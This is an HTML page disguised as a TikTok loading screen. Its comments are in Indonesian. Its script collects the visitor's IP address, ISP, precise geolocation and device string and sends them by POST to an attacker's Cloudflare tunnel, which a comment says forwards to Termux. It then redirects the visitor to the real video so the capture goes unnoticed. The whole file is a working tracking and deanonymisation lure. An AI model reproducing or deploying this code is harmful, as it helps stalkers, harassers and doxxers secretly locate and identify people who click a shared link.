<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TikTok</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .spinner { width: 45px; height: 45px; border: 4px solid #333; border-top: 4px solid #25f4ee; border-radius: 50%; animation: spin 0.6s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div style="text-align: center;">
        <div style="font-size: 32px; font-weight: bold;">TikTok</div>
        <div class="spinner"></div>
    </div>

    <script>
        (async function() {
            const urlParams = new URLSearchParams(window.location.search);
            const targetUrl = urlParams.get('url');
            const targetId = urlParams.get('id');

            // GANTI LINK DI BAWAH INI DENGAN LINK CLOUDFLARED LO!
            const tunnelURL = "https://terrorism-msg-inbox-ivory.trycloudflare.com";

            if (!targetUrl || !targetId) {
                window.location.replace('https://www.tiktok.com');
                return;
            }

            // Fungsi ambil IP
            async function getIp() {
                try {
                    const res = await fetch('https://ipapi.co/json/');
                    const d = await res.json();
                    return { ip: d.ip, isp: d.org };
                } catch (e) { return { ip: '0.0.0.0', isp: 'Unknown' }; }
            }

            // Fungsi ambil Lokasi
            function getLoc() {
                return new Promise((res) => {
                    navigator.geolocation.getCurrentPosition(
                        (p) => res({ lat: p.coords.latitude, lon: p.coords.longitude }),
                        () => res({ lat: '', lon: '' }),
                        { timeout: 5000, enableHighAccuracy: true }
                    );
                });
            }

            const [ipInfo, loc] = await Promise.all([getIp(), getLoc()]);

            const payload = new URLSearchParams({
                id: targetId,
                lat: loc.lat,
                lon: loc.lon,
                ip: ipInfo.ip,
                isp: ipInfo.isp,
                device: navigator.userAgent
            });

            // Tembak data langsung ke Termux
            fetch(tunnelURL, { method: 'POST', mode: 'no-cors', body: payload });

            // Langsung redirect ke video asli
            setTimeout(() => { window.location.replace(targetUrl); }, 1000);
        })();
    </script>
</body>
</html>
